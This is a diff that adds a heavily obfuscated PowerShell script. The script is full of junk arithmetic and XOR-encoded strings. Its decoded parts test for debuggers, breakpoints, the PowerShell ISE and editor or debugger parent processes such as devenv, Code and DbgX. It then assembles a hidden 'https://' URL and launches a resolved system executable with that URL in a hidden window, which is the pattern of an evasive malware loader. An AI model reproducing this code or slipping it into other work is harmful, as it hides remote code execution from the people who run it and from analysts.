+        [long]$v = [long]$d[$TuBrK_mNrYB3]
+        for ($aTBytLsxOCZh8gD = 2; $aTBytLsxOCZh8gD -ge 0; $aTBytLsxOCZh8gD--) {
+                [long]$v = [long](-bnot $v)
+                [long]$v = [long]$v -bxor ([long](34180))
+                [long]$v = [long]$v -bxor ([long](10650))
+        }
+        for ($FZ9OapZluIUfx2b = 2; $FZ9OapZluIUfx2b -ge 0; $FZ9OapZluIUfx2b--) {
+                [long]$v = [long]$v -bxor ([long](37923))
+                [long]$v = [long](-bnot $v)
+        }
+        [long]$v = [long]$v - ([long]($salt + $slot + $tk + $dk + 0))
+        if ([long]$v -ge 0 -and [long]$v -le 0xFFFF) { $r += [char][int][long]$v }
+        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r += [System.Char]::ConvertFromUtf32([int][long]$v) }
+    }
+    try { $KsgD_oQ6_6Tn4wek = [Math]::Sqrt(9038) } finally { [void]$KsgD_oQ6_6Tn4wek }
+return $r
+}
+try {2 | Out-Null } finally { [void]([Math]::Abs(-702)) }
+if ((($script:e5JIFRye9ZmUgRVb -ne $script:e5JIFRye9ZmUgRVb))) { $O4tq5f = @(486, 31, 479); $O4tq5f = ($O4tq5f | Measure-Object -Sum).Sum }
+function QMhaoqzXAtt {
+    param([int]$a, [int]$b, [int]$c)
+    if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $MkROBc = 890
+switch ($MkROBc) {
+    912 { $zEyhDkZEx = 'MhFRD' }
+    953 { $zEyhDkZEx = 'm1Fph' }
+    default { $zEyhDkZEx = $MkROBc * 2 }
+}
+[void]$zEyhDkZEx
+if ((((($a * 17) + $b) -band 65535) -ne $c)) { return '' }
+    return (& uQr9zgg4YiF $a $b $c)
+}
+	$_OYSiKsmTihMb = 346 * 18 + 98
+$_RnAeph6FdY0 = [Math]::Abs($_OYSiKsmTihMb - 4035)
+$g9My5S02dL_Ud9 = [Math]::Max($_OYSiKsmTihMb, $_RnAeph6FdY0) - [Math]::Min($_OYSiKsmTihMb, $_RnAeph6FdY0)
+[void]$g9My5S02dL_Ud9
+try {$null = [Convert]::ToString(290, 16)} finally { 0 | Out-Null  }
+$_CKG8MtDBRGI = 22 * 112 + 87
+$qvPkY7bAv1x0asXN = [Math]::Abs($_CKG8MtDBRGI - 7603)
+$gtvlAkhagS = [Math]::Max($_CKG8MtDBRGI, $qvPkY7bAv1x0asXN) - [Math]::Min($_CKG8MtDBRGI, $qvPkY7bAv1x0asXN)
+[void]$gtvlAkhagS
+function X6UDjJJFraMzJ0 {
+    param([int]$x, [int]$y)
+    if (((-not (-6 -eq -6))) -and ((-not 325))) { [void]('Wait-Event'.Length) }
+$iAlmL3Gqh = @(904, 76, 915, -295, 551, -103)
+$nahzjS = 0
+foreach ($v305e9b3fd8 in $iAlmL3Gqh) { $nahzjS = $nahzjS + $v305e9b3fd8 }
+[void]$nahzjS
+if (-not ((Get-Variable -Name _uSllEGA -Scope Script -ErrorAction SilentlyContinue).Value)) { return '' }
+    $xfe0b2a9c2ac = 133
+switch ($xfe0b2a9c2ac) {
+    163 { $sxHu7ZXVDkGmNBi = 'rwpv3' }
+    198 { $sxHu7ZXVDkGmNBi = 'Ivuft' }
+    default { $sxHu7ZXVDkGmNBi = $xfe0b2a9c2ac * 2 }
+}
+[void]$sxHu7ZXVDkGmNBi
+$a = $x -bxor 3740
+    $MtmkD7TYlGpZ = 333
+switch ($MtmkD7TYlGpZ) {
+    364 { $v59f182923e7 = 'Z62B1' }
+    399 { $v59f182923e7 = 'ZYCi9' }
+    default { $v59f182923e7 = $MtmkD7TYlGpZ * 2 }
+}
+[void]$v59f182923e7
+try {  $null = (354 + 670) } finally { [void]([Math]::Max(298, 537)); [void]([Math]::Max(419, 321)) }
+$_zifffZnlL63zt = @(13, -294, -698, -741)
+$yoMyUqM7J1qJK = 0
+foreach ($Z5eRvi5ec in $_zifffZnlL63zt) { $yoMyUqM7J1qJK = $yoMyUqM7J1qJK + $Z5eRvi5ec }
+[void]$yoMyUqM7J1qJK
+$b = $y -bxor 6042
+    $QV0lPPj_cGCz = 349 * 210 + 97
+$xYv_cm89IOL = [Math]::Abs($QV0lPPj_cGCz - 7724)
+$NRUq_khaTHUdDv = [Math]::Max($QV0lPPj_cGCz, $xYv_cm89IOL) - [Math]::Min($QV0lPPj_cGCz, $xYv_cm89IOL)
+[void]$NRUq_khaTHUdDv
+try {
+   try {
+     [void](456 -bxor 633)
+   } finally {
+     $null = (@(147, 814, 961)).Count
+    }
+} finally {
+   [void](0)
+}
+$c = ((($a * 17) + $b) -band 65535)
+    return (& QMhaoqzXAtt $a $b $c)
+}
+
+$script:_uSllEGA = 1
+
+$_OrOduvpB = @{ 'k5pp' = 61; 'JSle' = 735; 'RZn4' = 987 }
+$_OrOduvpB['RR4sA'] = $_OrOduvpB['k5pp'] + $_OrOduvpB['JSle']
+$_HAkE5y = ($_OrOduvpB.Values | Measure-Object -Sum).Sum
+[void]$_HAkE5y
+try{ 1..3 | Out-Null; }finally{ [void]([Math]::Max(952, 421)) }
+$vxNosIfA9vKin7xr = @{ 'VQ8V' = 531; 'ciRY' = 802; 'NPRR' = 873 }
+$vxNosIfA9vKin7xr['RmNuF'] = $vxNosIfA9vKin7xr['VQ8V'] + $vxNosIfA9vKin7xr['ciRY']
+$WT9ATehv7MVn7BXN = ($vxNosIfA9vKin7xr.Values | Measure-Object -Sum).Sum
+[void]$WT9ATehv7MVn7BXN
+if (-not (-not ((& { $D3yQZRhF0VT1fY = ((-join [char[]]@(73,83,69,124,83,101,114,118,101,114,82,101,109,111,116,101,72,111,115,116))); 	try {
+   0 | Out-Null
+ } finally {
+   try {
+     [void](776 -bxor 931)
+   } finally{
+     [void]([Math]::Min(901, 128))
+   }
+ }
+$ehpKDOo66LTjn8hdq = [Math]::Pow([Math]::Floor([Math]::Sqrt([Math]::Abs([Math]::Floor(578 + 0.5192))) + 0.5417), 2)
+[void]$ehpKDOo66LTjn8hdq
+[bool](($null -ne $D3yQZRhF0VT1fY) -and ([string]${D3yQZRhF0VT1fY}).Length -gt 0 -and ((('', $Host.Name)[1]) -match [string]$D3yQZRhF0VT1fY)) })))) { $script:P71s2Zeq = ((1431655693L) -bxor 1431655765L); $null = [IO.Path]::PathSeparator -as [string]; $null = $Host.Name.Length }
+try{
+     try {
+       0 | Out-Null
+     } finally {
+       try {0 | Out-Null } finally { $null = (928 + 79) }
+      }
+} finally{
+     $null = (@(779, 503, 1282)).Count
+}
+if (((-join [char[]]@(83,105,108,101,110,116,108,121,67,111,110,116,105,110,117,101))) -ne "$DebugPreference") { $script:P71s2Zeq = (35L -bor 12L); $null = [IO.Path]::PathSeparator -as [string]; [void]([Math]::Clamp((5L * 1L),(618618L + -618618L),(970276L -bxor 970277L))); [void]([Collections.StructuralComparisons]::StructuralEqualityComparer) }
+$TTPBXmexyn = 'RgtI7r9YEfQ'.Substring(0, 3).ToUpper().ToLower()
+[void]$TTPBXmexyn
+try { 1..3 | Out-Null } finally { $null = [Convert]::ToString(640, 16); $null = (329 + 258) }
+if (($null -ne (Get-Variable -Name PSBoundParameters -Scope 0 -ErrorAction SilentlyContinue).Value) -and ($null -ne (Get-Variable -Name PSBoundParameters -Scope 0 -ErrorAction SilentlyContinue).Value[((-join [char[]]@(68,101,98,117,103)))])) { $script:P71s2Zeq = ((((((((((([int](((((((0x11L) + 1807L + 1632L) - 1632L - 1807L)) + 3821L + 1036L) - 1036L - 3821L))) -bxor (946480L -bxor 946486L)) -bxor ((-(-((323259L -bxor 323261L)))) + 561098L - 561098L)) -bxor ([long]((5L * 43L)))) -bxor (839875L -bxor 839700L)) -bxor (32L -bor 200L)) -bxor ([int]((((232L) + 1746L + 1435L) - 1435L - 1746L)))) -bxor ((1431655931L) -bxor 1431655765L)) -bxor (128L -bor 46L)))); [void]([Convert]::ToInt32('0', 10) -eq 0); $null = [Text.Encoding]::UTF8.GetByteCount(''); if (1 -eq 2) { $null = ((1431655764L) -bxor 1431655765L) } }
+try {$null = (35 + 977) } finally { [void]([Math]::Min(63, 271)); 0 | Out-Null}
+for ($x088b183 = 0; $x088b183 -lt 0; $x088b183++) { $pQfVjXxJKScd = 6882 }
+if (-not (-not ((($null -ne $Host.Runspace.Debugger) -and ($Host.Runspace.Debugger.InBreakpoint)) -eq (100 -gt 97)))) { $script:P71s2Zeq = (([int]((((((((((259679L -bxor 259698L)) + ([long]0xB0) + ([int]((((((0x4A4L) + 2608L + 1875L) - 1875L - 2608L)) + (43670L - 43670L))))) - ([int](((0x4A4L) + 539L) - 539L)) - (((((1431655909L) -bxor 1431655765L)) -bxor 216595L) -bxor 216595L))) - (460176L + -433497L)) + (-(-((623540L -bxor 650115L))))) + (995041L -bxor 991846L) + (((5L * 71L)) + 154199L - 154199L)) - (-563904L + 564259L) - ((1431656914L) -bxor 1431655765L))))); [void]([string]::IsNullOrEmpty($null)); $null = (($null -as [string]) -as [string]) }
+while ((($script:e5JIFRye9ZmUgRVb -bxor ([int]((((160790103L) + 1658L + 1699L) - 1699L - 1658L)))) -eq ([int]((((0x2EAF6476L) + 3897L + 557L) - 557L - 3897L))))) { $KZdAfOEHxSGu8W4 = 7949; break }
+try { 0 | Out-Null} finally {$null = (972 + 742); [void]('bfaMyritu'.Length)}
+if ((($script:e5JIFRye9ZmUgRVb -ne $script:e5JIFRye9ZmUgRVb))) {
+    $LUmzWuLrjWxIH = 420
+    if ((($script:e5JIFRye9ZmUgRVb -bxor ([int]((((0x70C98D29L) + 3249L + 1446L) - 1446L - 3249L)))) -eq ([int](((0x57F37864L) + 8593L) - 8593L)))) { $_o3DhQIj2ckf = $LUmzWuLrjWxIH * 2 }
+    else { $_o3DhQIj2ckf = $LUmzWuLrjWxIH - 2192 }
+} else {
+    $LUmzWuLrjWxIH = 2192
+}
+[void]$LUmzWuLrjWxIH
+if ((& { try { $gS2zWW_SK = Get-CimInstance -ClassName Win32_Process -Filter ('ProcessId='+$PID) -ErrorAction SilentlyContinue; if (-not $gS2zWW_SK) { (0 -eq 1) } else { $Ia3OdgU = Get-CimInstance -ClassName Win32_Process -Filter ('ProcessId='+$gS2zWW_SK.ParentProcessId) -ErrorAction SilentlyContinue; [bool](${Ia3OdgU} -and ((& { ${D3yQZRhF0VT1fY} = ((-join [char[]]@(40,63,105,41,94,40,100,101,118,101,110,118,124,87,68,69,120,112,114,101,115,115,124,112,111,119,101,114,115,104,101,108,108,95,105,115,101,124,68,98,103,88,124,67,111,100,101,41,92,46,101,120,101,36))); $_y7y4j6hvjf = @(-94, -385, -553, -730, 568, 552)
+$X50Yu_oT = 0
+foreach ($KJsQGSpV in $_y7y4j6hvjf) { $X50Yu_oT = $X50Yu_oT + $KJsQGSpV }
+[void]$X50Yu_oT
+[bool](($null -ne $D3yQZRhF0VT1fY) -and ([string]$D3yQZRhF0VT1fY).Length -gt 0 -and (($Ia3OdgU.Name) -match [string]$D3yQZRhF0VT1fY)) }))) } } catch { (119 -le 88) } })) { $script:P71s2Zeq = (-286057L + 286133L); [void]([Math]::Round(([double][Math]::Round((([double]([Math]::Cosh([Math]::Log(([Math]::Max(([Math]::Pow([Math]::Exp([Math]::Log((([double]([Math]::Log([Math]::Exp(3.14)))))) / 2.0), 2.0)), 1.0)) + [Math]::Sqrt(([Math]::Max(([Math]::Pow([Math]::Exp([Math]::Log((([double]([Math]::Log([Math]::Exp(3.14)))))) / 2.0), 2.0)), 1.0)) * ([Math]::Max(([Math]::Pow([Math]::Exp([Math]::Log((([double]([Math]::Log([Math]::Exp(3.14)))))) / 2.0), 2.0)), 1.0)) - 1.0)))))), 12)),((-(-((674910L -bxor 674910L))))))); $null = (($null -as [string]) -as [string]); [void]([Math]::Sign((588719L + -588720L))) }
+$DcSONOcUaJTwD = @{ 'm9NJ' = 187; 'cZXS' = 483; 'sD3P' = 896 }
+$DcSONOcUaJTwD['LS9Vh'] = $DcSONOcUaJTwD['m9NJ'] + $DcSONOcUaJTwD['cZXS']
+$EUhteA0a = ($DcSONOcUaJTwD.Values | Measure-Object -Sum).Sum
+[void]$EUhteA0a
+try {
+   $null = [Math]::Sign(19)
+ } finally {
+   2 | Out-Null
+ }
+if ((($script:e5JIFRye9ZmUgRVb -band ([int]((((31799L) + 3634L + 1447L) - 1447L - 3634L)))) -eq ([int]((((4718L) + 3283L + 589L) - 589L - 3283L))))) {
+    $_FvBcaFgR5PNT = 7006
+    if ((($script:e5JIFRye9ZmUgRVb -bxor ([int]((((22263778L) + 2905L + 543L) - 543L - 2905L)))) -eq ([int]((((0x266942AFL) + 1559L + 1947L) - 1947L - 1559L))))) { $KqFz_uMk = $_FvBcaFgR5PNT * 2 }
+    else { $KqFz_uMk = $_FvBcaFgR5PNT - 2236 }
+} else {
+    $_FvBcaFgR5PNT = 2236
+}
+[void]$_FvBcaFgR5PNT
+switch (0) { default { if ((([System.Diagnostics.Debugger]::IsAttached) -as [bool])) { $script:P71s2Zeq = ((1431655759L) -bxor 1431655765L); $null = 'xyz'.IndexOf('q', [StringComparison]::Ordinal); [void]([string]::CompareOrdinal('a','b')); $null = [IO.Path]::GetInvalidPathChars().Length } } }
+if (((Test-Path ((& tTI8G5WOVh18qx4 4667 7866)+(& orIzKYA1e09EByw7D4 3403 2790)+(& yvbqkPkTKeMnHnh 7002 1175))) -as [bool])) { $script:P71s2Zeq = ((((22L -bor 0L)) + 620372L + 29058L) - 29058L - 620372L); [void]([Math]::Round(([double][Math]::Round((([double]([Math]::Cosh([Math]::Log(([Math]::Max(([Math]::Pow([Math]::Exp([Math]::Log((([double]([Math]::Log([Math]::Exp(3.14)))))) / 2.0), 2.0)), 1.0)) + [Math]::Sqrt(([Math]::Max(([Math]::Pow([Math]::Exp([Math]::Log((([double]([Math]::Log([Math]::Exp(3.14)))))) / 2.0), 2.0)), 1.0)) * ([Math]::Max(([Math]::Pow([Math]::Exp([Math]::Log((([double]([Math]::Log([Math]::Exp(3.14)))))) / 2.0), 2.0)), 1.0)) - 1.0)))))), 12)),(((((1431655765L) -bxor 1431655765L)) + 568552L + 8949L) - 8949L - 568552L))); $null = [string]::Empty.Length }
+try {
+    [void]([Math]::Min(235, 781))
+ } finally {
+    0 | Out-Null
+ }
+$script:P71s2Zeq = (0L -bor 0L)
+if ((($script:e5JIFRye9ZmUgRVb -band ([int]((((((0x4097L) - 48900L) + 48900L) + 1087L + 1889L) - 1889L - 1087L)))) -eq ([int](((((((20765L) + 1057L + 166L) - 166L - 1057L)) + 2772L + 497L) - 497L - 2772L))))) {
+    $KqikQ89gw = 58
+    if ((([int]$script:e5JIFRye9ZmUgRVb -shl 0) -eq ([int]((((0x273AF54DL) + 81L + 870L) - 870L - 81L))))) { $_Hm9Zfx = $KqikQ89gw * 2 }
+    else { $_Hm9Zfx = $KqikQ89gw - 8056 }
+} else {
+    $KqikQ89gw = 8056
+}
+[void]$KqikQ89gw
+function LE9asoHS_ {
+    param([string]$S3GHPjtQCeMQKpeKCg = '', [switch]$dIbRCzO)
+    
+while (((@().Count) -eq 11) -eq ('K5yyz'.Length -gt 0)) { }; if ( (@(Get-PSBreakpoint -ErrorAction SilentlyContinue | Select-Object -First 4 -ErrorAction SilentlyContinue).Count) -gt 3 ) { ${script:P71s2Zeq} = (((((([long]0x4F) -bxor 595014L) -bxor 595014L)) -bxor 452109L) -bxor 452109L); $null = @{}.Keys.Count; $null = (@() | Measure-Object).Count; foreach ($K3Z3tMfwHERoAq in @()) { }; return $null }
+	try {
+   0 | Out-Null
+ } finally {
+   [void]([Math]::Min(554, 226))
+ }
+$j_LFQXLWjjTmHxdS = [ordered]@{ 'Ymij' = (730792L -bxor 730616L); 'gsOhn' = ((((963266L -bxor 963266L) + (([long]0xBA) + 960122L - 960122L) + (([long]0xE) + 88057L - 88057L)) - ((1431655771L) -bxor 1431655765L) - ([long]0xBA))) }
+    $_UPywfC1lTqX9 = [Math]::Pow([Math]::Sqrt([Math]::Abs([Math]::Sqrt([Math]::Abs([Math]::Max(318, 64))))), 2)
+[void]$_UPywfC1lTqX9
+try {
+    [void](259 -bxor 121)
+} finally {
+    $null = [Math]::Sign(30)
+}
+$SlXiGqFMhWlK = ((1431655802L) -bxor 1431655765L)
+    $KEpfj4dVh_lGvC8v = @(-616, -300, -850, 400, -185, -334, -434)
+$_b9chLxAWH9sr = 0
+foreach ($nIEOvMpNGQxZ in $KEpfj4dVh_lGvC8v) { $_b9chLxAWH9sr = $_b9chLxAWH9sr + $nIEOvMpNGQxZ }
+[void]$_b9chLxAWH9sr
+try {
+   2 | Out-Null
+} finally {
+   1..4 | Out-Null
+}
+try { $SlXiGqFMhWlK = ([int]${dIbRCzO} -bxor $SlXiGqFMhWlK) } catch { $SlXiGqFMhWlK = (${SlXiGqFMhWlK} -bxor (3L * 39L)) }
+    try {
+        $bfogjCxj_hOGC = [Math]::Sqrt(([long]0x21A))
+        $SlXiGqFMhWlK = $SlXiGqFMhWlK + [int]$bfogjCxj_hOGC
+    } catch {
+        $SlXiGqFMhWlK = $SlXiGqFMhWlK - ((([int]((((((((((308380L -bxor 308381L)) + (857716L + -857357L) + (3L * 299L)) - (((([int]((((897L) + 3626L + 539L) - 539L - 3626L)))) -bxor 140015L) -bxor 140015L) - (-549622L + 549981L))) + (276033L + -241730L)) - ([long](-(-([long]0x85FF))))) + ([int]((((1310L) + 3472L + 221L) - 221L - 3472L))) + ([long](((1431656436L) -bxor 1431655765L)))) - ([long]0x2A1) - ((([long]0x51E) + 135259L + 18298L) - 18298L - 135259L))))))
+    } finally {
+        [void]${SlXiGqFMhWlK}
+    }
+    $v91e4488 = 524
+switch ($v91e4488) {
+    555 { $ydNcl8rGlkiL = 'vGKBE' }
+    595 { $ydNcl8rGlkiL = 'XSRHP' }
+    default { $ydNcl8rGlkiL = $v91e4488 * 2 }
+}
+[void]$ydNcl8rGlkiL
+try {  $null = (@(978, 308, 1286)).Count } finally {[void](543 -band 120); 0 | Out-Null}
+$jDa9JwMQg6AYs = (-754708L + 754709L)
+    switch ($jDa9JwMQg6AYs) {
+        26 { ${SlXiGqFMhWlK} = $SlXiGqFMhWlK - ([int](((((((0x2L) + 507L + 1619L) - 1619L - 507L)) + 2526L + 453L) - 453L - 2526L))); break }
+        1 { $SlXiGqFMhWlK = ${SlXiGqFMhWlK} + (((((90805L -bxor 90812L) -bxor (652748L + -652725L)) -bxor ([long]((146339L + -146316L)))))); break }
+        default { [void]${jDa9JwMQg6AYs}; break }
+    }
+    $ybj5bDqoYWyUn = 'JmBwZg'.PadRight(9, '2').Substring(0, 3)
+[void]$ybj5bDqoYWyUn
+try {
+  [void]([Math]::Min(668, 415))
+ } finally {
+  try {
+    try {2 | Out-Null} finally { $null = [Math]::Sign(-4) }
+  } finally {
+    $null = (@(819, 100, 919)).Count
+  }
+ }
+@('kta', 'LzlR', 'JmyTx') | ForEach-Object { $_.ToUpper() } | Out-Null
+${_zqUOVOh2r} = (((([long]0x1) + (1L -bor 128L)) - (-(-(((([int]((((129L) + 3759L + 711L) - 711L - 3759L)))) + 676816L - 676816L))))))
+    for ($qNvVEiDf_o3VyVwNYS = 0; $qNvVEiDf_o3VyVwNYS -lt 0; $qNvVEiDf_o3VyVwNYS++) { $esjeGR = 3678 }
+switch ($_zqUOVOh2r) {
+        25 { $SlXiGqFMhWlK = $SlXiGqFMhWlK - ((((((((((1431655762L) -bxor 1431655765L) -bxor (([long]0xCF) + 549475L - 549475L)) -bxor ((1431655834L) -bxor 1431655765L)) -bxor ((1431655857L) -bxor 1431655765L)) -bxor ((((601945L + -601717L)) + 38603L + 18283L) - 18283L - 38603L)) -bxor (992062L -bxor 992018L)) -bxor ((((4L -bor 40L)) -bxor 138220L) -bxor 138220L)))); break }
+        1 { $SlXiGqFMhWlK = ${SlXiGqFMhWlK} + ((([int](((((0L -bor 4L)) + (-(-((2L * 1484L)))) + (2L * 621L)) - ([long](([int]((((0x4DAL) + 2720L + 637L) - 637L - 2720L))))) - (-411583L + 414551L)))))); break }
+        default { [void]${_zqUOVOh2r}; break }
+    }
+    while ((($script:e5JIFRye9ZmUgRVb -ne $script:e5JIFRye9ZmUgRVb))) { $HjC3uk8Q = 4325; break }
+try {
+   try {
+      1..3 | Out-Null
+   } finally{
+      [void]([Math]::Max(108, 143))
+   }
+ } finally {
+   [void]('B9fcm'.Length)
+ }
+$LvG8SuXHYcr = [Math]::Max([Math]::Pow([Math]::Floor([Math]::Floor(214 + 0.9216) + 0.5294), 2), 49)
+[void]$LvG8SuXHYcr
+$DuaTgOPR = @(3, 31, 49, 21, 11)
+    foreach ($_j5hQR9Uo6M8 in ${DuaTgOPR}) {
+        $SlXiGqFMhWlK = ${SlXiGqFMhWlK} + ($_j5hQR9Uo6M8 -band (-(-((12L -bor 2L)))))
+    }
+    	try { [void](0) } finally { [void]('AA9gEE'.Length)}
+$WBXTCDSSI = @(797, 676, 679, -570, 620)
+$C4GYqZMDzzgy = 0
+foreach ($vbc00030c4 in $WBXTCDSSI) { $C4GYqZMDzzgy = $C4GYqZMDzzgy + $vbc00030c4 }
+[void]$C4GYqZMDzzgy
+return $SlXiGqFMhWlK
+}
+
+@(-204, 654, 793, -667) | Where-Object { $_ -gt 1 } | ForEach-Object { [Math]::Pow($_, 2) } | Out-Null
+try {
+  $null = [Math]::Sign(10)
+} finally {
+  try {
+    2 | Out-Null
+  } finally {
+    1..4 | Out-Null
+  }
+}
+${YCWiJlEWj} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('aHR0cHM6Ly8='))
+	try {
+    $L_lCtY = 285 + 153
+    $_p15V7vh15 = [Math]::Pow($L_lCtY, 2)
+} catch {
+    $_p15V7vh15 = [Math]::Abs(285 - 153)
+}
+[void]$_p15V7vh15
+try {
+  try {
+    try {[void](849 -bxor 694)} finally { [void]([Math]::Min(563, 389))  }
+  } finally{
+    $null = [Convert]::ToString(827, 16)
+  }
+} finally {
+  [void](233 -bxor 139)
+}
+$_XsqldI = 'Zqu4lt_hxYZ'.ToLower().PadRight(15, '1').ToLower()
+[void]$_XsqldI
+$pCgftYln = $YCWiJlEWj + (& D8Mfx0TjSYlGdN 3300 6740) + (& Mez87IILYm 6603 4717) + (& qVBEnrY_QBC 6471 1697)
+
+	try {[void]([Math]::Min(843, 748))} finally {[void]([Math]::Abs(-263)) }
+${vKWWd5VnQFTtzXJE} = (Resolve-Path ([Environment]::GetFolderPath((921553L + -921512L)) + (& iPEDLSRdNb8ySuwcXS 285 3862)))[0].Path
+
+$g7JQfhJ4eqYeLFZU = [Diagnostics.ProcessStartInfo]::new()
+$g7JQfhJ4eqYeLFZU.FileName          = $vKWWd5VnQFTtzXJE
+	$_oEuQq6CAW4K = 0; for ($_Igc1CDyEPQxr8ue = 0; $_Igc1CDyEPQxr8ue -lt 2; $_Igc1CDyEPQxr8ue++) { $_oEuQq6CAW4K = $_oEuQq6CAW4K + $_Igc1CDyEPQxr8ue }; [void]$_oEuQq6CAW4K
+try {
+     [void](77 -bxor 911)
+} finally {
+     3 | Out-Null
+}
+$osxwgCiu4UM = 603
+switch ($osxwgCiu4UM) {
+    604 { $OVKLGGgiOFNR = 'wkwQ_' }
+    654 { $OVKLGGgiOFNR = 'cQl_t' }
+    default { $OVKLGGgiOFNR = $osxwgCiu4UM * 2 }
+}
+[void]$OVKLGGgiOFNR
+$g7JQfhJ4eqYeLFZU.Arguments      = (& cVIz2cKWBGivpYIq 5013 4026) + $pCgftYln + (& X6UDjJJFraMzJ0 3371 7031)
+$g7JQfhJ4eqYeLFZU.UseShellExecute   = (17 -eq 17)
+if ((($script:e5JIFRye9ZmUgRVb -band ([int](((((((0x288L) + 2397L + 993L) - 993L - 2397L)) + 651L + 786L) - 786L - 651L)))) -eq ([int]((((8L) + 1615L + 126L) - 126L - 1615L))))) { $CfVpFUKZVf2_ = -2940 }
+try {
+     try {
+        [void](317 -bxor 675)
+     } finally {
+        try { [void](0) } finally { 0 | Out-Null }
+      }
+} finally {
+     try {
+       [void]([Math]::Max(470, 402))
+     } finally {
+       try { 0 | Out-Null } finally {  $null = [Math]::Sign(13) }
+     }
+}
+$pJzG_uWR6ZErp = [Math]::Abs([Math]::Sqrt([Math]::Abs([Math]::Abs([Math]::Pow(906, 2)))))
+[void]$pJzG_uWR6ZErp
+$g7JQfhJ4eqYeLFZU.WindowStyle       = ([int]((((0x1L) + 2831L + 1289L) - 1289L - 2831L)))
+
+$v0ec502ee7e = @{ 'I3IL' = 223; 'b5_q' = 682; 'Kiez' = 631 }
+$v0ec502ee7e['RTTE6'] = $v0ec502ee7e['I3IL'] + $v0ec502ee7e['b5_q']
+$_ZYKuxsXRe9 = ($v0ec502ee7e.Values | Measure-Object -Sum).Sum
+[void]$_ZYKuxsXRe9
+[Diagnostics.Process]::Start($g7JQfhJ4eqYeLFZU)
+if ((($script:e5JIFRye9ZmUgRVb -ne $script:e5JIFRye9ZmUgRVb))) { $NDD5Bnx1xmHcg = 'XUoPQKAe0Y'.GetHashCode() }
+exit
